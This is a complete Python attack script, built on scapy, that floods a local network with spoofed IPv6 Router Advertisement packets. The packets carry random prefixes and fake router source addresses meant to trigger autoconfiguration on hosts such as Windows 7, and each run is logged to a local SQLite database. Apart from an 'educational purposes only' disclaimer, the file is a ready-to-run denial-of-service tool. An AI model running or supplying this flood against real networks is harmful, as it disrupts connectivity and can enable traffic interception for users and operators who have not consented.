#!/usr/bin/env python3

"""
ipv6_realistic_ra_flood.py

Floods the network with realistic, spoofed IPv6 Router Advertisement packets.
Designed to trigger autoconfiguration logic in IPv6-enabled hosts (e.g., Windows 7).
Logs each attack attempt in ipv6_ra_flood.db.

FOR EDUCATIONAL PURPOSES ONLY. USE IN CONTROLLED ENVIRONMENTS.
"""

import argparse
import time
import sqlite3
from datetime import datetime
from random import randint
from scapy.all import (
    IPv6,
    ICMPv6ND_RA,
    ICMPv6NDOptSrcLLAddr,
    ICMPv6NDOptPrefixInfo,
    Ether,
    sendp,
    get_if_hwaddr
)

DB_FILE = "ipv6_ra_flood.db"


def log_attack(interface, count, success, username, date):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS ra_flood (
                  id INTEGER PRIMARY KEY AUTOINCREMENT,
                  interface TEXT,
                  packet_count INTEGER,
                  success BOOLEAN,
                  username TEXT,
                  date TIMESTAMP)''')
    c.execute('INSERT INTO ra_flood (interface, packet_count, success, username, date) VALUES (?,?,?,?,?)',
              (interface, count, success, username, date))
    conn.commit()
    conn.close()


def random_ipv6_prefix():
    # Generate a random /64 IPv6 prefix, e.g., 2001:db8:xxxx:xxxx::
    return f"2001:db8:{randint(0, 0xffff):x}:{randint(0, 0xffff):x}::"


def flood_realistic_ra(iface, mac, count):
    """Send realistic, randomized RA packets to affect IPv6 hosts."""
    sent = 0
    try:
        for _ in range(count):
            fake_prefix = random_ipv6_prefix()
            src_ip = f"fe80::{randint(1, 0xffff):x}"
            pkt = Ether(dst="33:33:00:00:00:01", src=mac) / \
                  IPv6(dst="ff02::1", src=src_ip) / \
                  ICMPv6ND_RA(routerlifetime=1800) / \
                  ICMPv6NDOptSrcLLAddr(lladdr=mac) / \
                  ICMPv6NDOptPrefixInfo(prefixlen=64, prefix=fake_prefix, L=1, A=1, validlifetime=3600, preferredlifetime=1800)

            sendp(pkt, iface=iface, verbose=False)
            sent += 1

        success = True
    except Exception as e:
        print(f"[!] Error sending RA packets: {e}")
        success = False

    return sent, success


def main():
    parser = argparse.ArgumentParser(description="IPv6 Realistic RA Flood")
    parser.add_argument("interface", help="Network interface to use (e.g., eth0)")
    parser.add_argument("--username", required=True, help="Your username (for logging)")
    parser.add_argument("--date", default=datetime.now().strftime("%Y-%m-%d %H:%M:%S"), help="Date of attack")
    parser.add_argument("--count", type=int, default=1000, help="Number of packets to send (default: 1000)")
    args = parser.parse_args()

    iface = args.interface
    mac = get_if_hwaddr(iface)

    print(f"[*] Starting realistic RA flood on {iface}...")
    total_sent, success = flood_realistic_ra(iface, mac, args.count)

    log_attack(iface, total_sent, success, args.username, args.date)
    print(f"[+] Sent {total_sent} RA packets. Success: {success}")


if __name__ == "__main__":
    main()
